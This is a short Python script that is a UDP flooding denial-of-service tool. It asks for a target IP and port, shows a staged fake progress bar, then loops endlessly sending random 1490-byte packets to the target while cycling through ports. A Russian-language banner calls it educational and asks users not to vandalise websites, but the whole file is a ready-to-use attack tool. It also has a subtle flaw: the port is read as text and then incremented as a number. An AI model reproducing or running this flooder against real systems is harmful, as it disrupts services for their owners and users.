import sys
import os
import time
import socket
import random
# Code Time
from datetime import datetime

from pip._vendor.distlib.compat import raw_input

now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

def out_red(text):
    print("\033[31m {}" .format(text))

out_red("Пожалуйста, используйте эту программу не для веб-вандализма! Используйте для учебных целей!                       create by CYBER BASTART")

ip = raw_input("IP Target : ")
port = input("Port       : ")


print("[                    ] 0% ")
time.sleep(5)
print("[=====               ] 25%")
time.sleep(5)
print("[==========          ] 50%")
time.sleep(5)
print("[===============     ] 75%")
time.sleep(5)
print("[====================] 100%")
time.sleep(3)
sent = 0
while True:
    sock.sendto(bytes, (ip, port))
    sent = sent + 1
    port = port + 1
    print("Sent %s packet to %s thought port:%s" % (sent, ip, port))
    if port == 65534:
        port = 1
